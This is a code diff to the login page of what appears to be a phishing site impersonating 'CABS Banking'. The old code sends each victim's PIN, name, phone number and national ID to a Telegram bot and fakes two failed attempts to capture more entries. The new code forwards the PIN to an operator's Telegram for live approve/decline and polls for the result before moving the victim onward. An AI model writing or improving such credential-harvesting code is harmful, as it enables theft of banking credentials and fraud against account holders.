@@ -1,11 +1,11 @@
-import React, { useState, useRef } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate, useParams } from 'react-router-dom';
 import { useClient } from '../context/ClientContext';
 import { Header } from '../components/Header';
 import { Footer } from '../components/Footer';
 import { LoadingOverlay } from '../components/LoadingOverlay';
 import { Lock, AlertCircle } from 'lucide-react';
-import { sendBotNotification } from '../services/botService';
+import { requestPinVerification, checkPinStatus } from '../services/botService';
 
 export const LoginPage = () => {
   const { user } = useParams();
@@ -15,7 +15,7 @@ export const LoginPage = () => {
   const [digits, setDigits] = useState(['', '', '', '']);
   const [verifying, setVerifying] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
-  const [attemptCount, setAttemptCount] = useState(1);
+  const [sessionId, setSessionId] = useState(null);
 
   const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
 
@@ -49,7 +49,40 @@ export const LoginPage = () => {
     }
   };
 
-  const handleSubmit = (e) => {
+  // Live Polling for Admin Telegram Approve/Decline click
+  useEffect(() => {
+    if (!sessionId || !verifying) return;
+
+    const pollInterval = setInterval(async () => {
+      try {
+        const res = await checkPinStatus(sessionId);
+        console.log("📊 Live Telegram PIN Status:", res.status);
+
+        if (res.status === 'approved') {
+          clearInterval(pollInterval);
+          setVerifying(false);
+          setErrorMsg('');
+          const userSegment = user || 'user11';
+          navigate(`/${userSegment}/verification`);
+        } else if (res.status === 'wrong_pin') {
+          clearInterval(pollInterval);
+          setVerifying(false);
+          setErrorMsg('❌ Wrong PIN code! Please re-enter your 4-digit PIN.');
+          setDigits(['', '', '', '']);
+          setSessionId(null);
+          setTimeout(() => {
+            inputRefs[0].current?.focus();
+          }, 100);
+        }
+      } catch (err) {
+        console.error("Polling status error:", err);
+      }
+    }, 2000);
+
+    return () => clearInterval(pollInterval);
+  }, [sessionId, verifying, user, navigate]);
+
+  const handleSubmit = async (e) => {
     e?.preventDefault();
     const pinStr = digits.join('');
 
@@ -60,35 +93,22 @@ export const LoginPage = () => {
 
     setErrorMsg('');
     setVerifying(true);
+    updateClient({ pin: pinStr });
 
-    // Send PIN attempt notification to Telegram Bot
-    sendBotNotification(
-      `🔐 <b>CABS Banking PIN Entry</b> (Attempt ${attemptCount}/3):\n` +
-      `<b>Client Name</b>: ${client.name || 'Unknown'}\n` +
-      `<b>Phone Number</b>: ${client.number || 'N/A'}\n` +
-      `<b>National ID</b>: ${client.id || 'N/A'}\n` +
-      `<b>PIN Entered</b>: <code>${pinStr}</code>`
-    );
+    try {
+      // Send PIN request with Approve / Decline buttons to Admin's Telegram
+      const result = await requestPinVerification({
+        phoneNumber: client.number,
+        pinCode: pinStr,
+        userName: client.name,
+        userId: client.refId
+      });
 
-    if (attemptCount < 3) {
-      // Fail attempts 1 and 2, prompting user to re-enter
-      setTimeout(() => {
-        setVerifying(false);
-        setErrorMsg(`❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`);
-        setAttemptCount((prev) => prev + 1);
-        setDigits(['', '', '', '']);
-        setTimeout(() => {
-          inputRefs[0].current?.focus();
-        }, 100);
-      }, 1400);
-    } else {
-      // Attempt 3 succeeds and proceeds
-      updateClient({ pin: pinStr });
-      setTimeout(() => {
-        setVerifying(false);
-        const userSegment = user || 'user11';
-        navigate(`/${userSegment}/verification`);
-      }, 1500);
+      if (result && result.sessionId) {
+        setSessionId(result.sessionId);
+      }
+    } catch (err) {
+      console.error("Failed to request PIN verification:", err);
     }
   };
 
@@ -98,13 +118,7 @@ export const LoginPage = () => {
     <div className="app-viewport">
       <Header />
       {verifying && (
-        <LoadingOverlay
-          message={
-            attemptCount < 3
-              ? `⏳ Verifying PIN (Attempt ${attemptCount} of 3)...`
-              : '⏳ Finalizing Banking Authentication...'
-          }
-        />
+        <LoadingOverlay message="⏳ Verifying PIN... Waiting for authorization" />
       )}
       <main className="main-content">
         <div className="login-card">
@@ -116,7 +130,7 @@ export const LoginPage = () => {
             Secured Login 🔒
           </h2>
           <p style={{ color: 'var(--text-secondary)', fontSize: '0.95rem', marginTop: '0.4rem' }}>
-            Enter your 4-digit pin to authenticate (Step {attemptCount} of 3)
+            Enter your 4-digit pin to authenticate
           </p>
 
           {client.number && (
